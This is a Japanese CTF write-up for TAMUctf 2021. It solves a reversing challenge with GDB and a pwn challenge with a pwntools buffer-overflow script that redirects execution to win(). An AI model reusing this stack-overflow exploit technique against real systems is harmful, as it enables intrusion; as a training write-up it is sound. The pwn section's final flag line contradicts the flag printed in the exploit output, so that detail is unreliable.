---
title: "TAMUctf 2021 Writeup"
date: 2021-05-04T15:30:00+09:00
lastmod: 2021-05-04T15:30:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Ftamuctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://tamuctf.com/challenges](https://tamuctf.com/challenges)
<br /><br />
去年のTAMU CTF 2020 ([Writeup](https://captureamerica.github.io/writeups/post/tamuctf_2020/)) は Network Pentest のチャレンジがあったりしたんですが、今年はなかったですね。残念〜。

<br />

800 points取りました。順位は、94thだったみたいです。（CTF TIME情報）

<br />

以下が解いたチャレンジです。

<img src="https://captureamerica.github.io/writeups/img/tamuctf_2021_Solved.png" alt="tamuctf_2021_Solved.png">

<br />


<br /><br />
## [Reversing]: Acrylic (100 points)
- - -
### Challenge
> This is an easy challenge. There is a flag that can be printed out from somewhere in this binary. Only one problem: There's a lot of fake flags as well.
<br /><br />
Hint: Try using GDB

Attachment:

- acrylic (ELF 64bit)


<br />

### Solution
問題文にあるように Fake flag が沢山あるため、stringsコマンドは使えません。<br /> (いちおう正解フラグもstringsで出てくるので、ひたすらSubmitしたら、そのうち当たりますけど。。)

<br />
GDBを使う前に、Ghidraでコードを見てみます。

```C
undefined8 main(void)
{
  puts("look at the code");
  return 0;
}


char * get_flag(void)
{
  int local_10;
  uint local_c;
  
  local_10 = 0x7b;
  local_c = 0;
  while (local_c < 0x7e4) {
    local_10 = ((local_10 + 1) * local_10) % 0x7f;
    local_c = local_c + 1;
  }
  return flags + (long)local_10 * 0x40;
}
```

<br />
main()は文字列を表示して終了するだけの関数です。

get_flag()は関数名から予想するに、flagを取得するための関数です。

<br />

GDBを使ってやることは、

1. main() で一旦break
2. get_flag() にもbreakをかけて、get_flag() へjump
3. returnする直前にbreakをかけて、戻り値を確認

となります。get_flag() 自体は flag を printf しないので、GDB内で値を確認する必要があります。

<br />

<pre>
gef➤ b main
gef➤ b get_flag
gef➤ jump get_flag
gef➤ disas get_flag
gef➤ b *0x00005555555546ab
gef➤ c

$rax   : 0x0000555555756620  →  "gigem{counteradvise_orbitoides}"
</pre>

<br />

Flag: `gigem{counteradvise_orbitoides}`



<br /><br />
<br /><br />
## [Pwn]: Handshake (150 points)
- - -
### Challenge
> Attack this binary and get the flag!
<br /><br />
openssl s_client -connect tamuctf.com:443 -servername handshake -quiet

Attachment:

- handshake (ELF 32bit)


<br />

### Solution
まず、問題文に出てくる openssl コマンドについてですが、News (announcement) で以下が出ていました。

<img src="https://captureamerica.github.io/writeups/img/tamuctf_2021_openssl.png" alt="tamuctf_2021_openssl.png">

<br />
socatでトンネルを確立したら、あとはローカルでやってるのと同じ感覚でできるようです。

<br /><br />

まずは、checksecを実行してみます。PIEは無効です。

<pre>
$ checksec handshake
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</pre>

<br />
vuln() 関数でBOFができます。他に、win()関数があるので、BOFを起こしてwin()に飛ぶだけです。

```C
void vuln(void)

{
  char local_2c [36];
  
  printf("Whats the secret handshake? ");
  fflush((FILE *)0x0);
  gets(local_2c);
  putchar(10);
  return;
}
```

<br />
GDBでwin()のアドレスを確認。

<pre>
gef➤  b main
Breakpoint 1 at 0x8049321

gef➤  r
:

gef➤  p win
$1 = {&lt;text variable, no debug info&gt;} 0x80491c2 <win>
</pre>

<br />

書いたコード。

```Python
#!/usr/bin/env python
from pwn import *

s = remote('127.0.0.1', 4444)

payload = ''
payload += b'A' * 36
payload += b'B' * 8
payload += p32(0x080491c2)  # win()

s.sendlineafter("Whats the secret handshake? ", payload)
print s.recv()
```

<br />

結果：

<pre>
$ socat -d TCP-LISTEN:4444,reuseaddr,fork EXEC:'openssl s_client -connect tamuctf.com\:443 -servername handshake -quiet'

$ ./handshake_solve.py 
[+] Opening connection to 127.0.0.1 on port 4444: Done

Correct! gigem{r37urn_c0n7r0l1337}
</pre>

<br>

Flag: `gigem{z1pT4st1c__$kiLl$$$}`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

